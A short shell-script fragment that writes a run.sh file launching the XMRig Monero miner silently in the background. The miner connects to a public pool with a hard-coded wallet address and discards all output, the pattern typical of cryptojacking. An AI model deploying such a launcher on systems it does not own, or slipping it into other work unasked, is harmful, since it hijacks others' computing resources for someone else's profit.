...
echo "cd && cd xmrig && cd build && ./xmrig -o pool.supportxmr.com:443 -u 44iRNKYSUrtjb98zcaj3egGHpEnG54a9eA45syijN2KR3Np3H39Ac2PcnARaT9Z3q17xZqgGyPDPoEmsSpLZBCojDKkx2xw -k --tls -p Linux /dev/null 2>&1 &" > run.sh && chmod +x run.sh
